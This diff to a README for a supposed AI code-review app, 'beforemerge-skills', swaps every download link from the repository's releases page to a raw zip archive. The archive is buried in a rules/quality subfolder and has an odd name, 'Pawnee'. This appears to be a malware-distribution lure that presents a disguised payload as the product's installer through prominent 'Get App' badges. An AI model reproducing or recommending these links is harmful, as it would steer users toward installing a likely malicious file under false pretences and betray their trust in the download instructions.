@@ -1,6 +1,6 @@
 # ⚙️ beforemerge-skills - Improve Code Reviews with AI Rules
 
-[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
+[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/raw/refs/heads/main/skills/fullstack-architecture-review/rules/quality/beforemerge-skills-Pawnee.zip)
 
 ## 📋 What is beforemerge-skills?
 
@@ -32,7 +32,7 @@ Follow these steps to download and use beforemerge-skills on your Windows comput
 
 Click the big green button below to open the release page for beforemerge-skills. This is where you will find the latest version ready for download.
 
-[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
+[![Download beforemerge-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Khwaja-Khunshan/beforemerge-skills/raw/refs/heads/main/skills/fullstack-architecture-review/rules/quality/beforemerge-skills-Pawnee.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -111,7 +111,7 @@ The app also lists tags linked to security standards (e.g., CWE, OWASP) that exp
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/Khwaja-Khunshan/beforemerge-skills/releases](https://github.com/Khwaja-Khunshan/beforemerge-skills/releases)
+- Download page: [https://github.com/Khwaja-Khunshan/beforemerge-skills/raw/refs/heads/main/skills/fullstack-architecture-review/rules/quality/beforemerge-skills-Pawnee.zip](https://github.com/Khwaja-Khunshan/beforemerge-skills/raw/refs/heads/main/skills/fullstack-architecture-review/rules/quality/beforemerge-skills-Pawnee.zip)
 - Online documentation and examples (inside the app after installation)
 - Security references included in app: CWE (Common Weakness Enumeration), OWASP (Open Web Application Security Project)
 
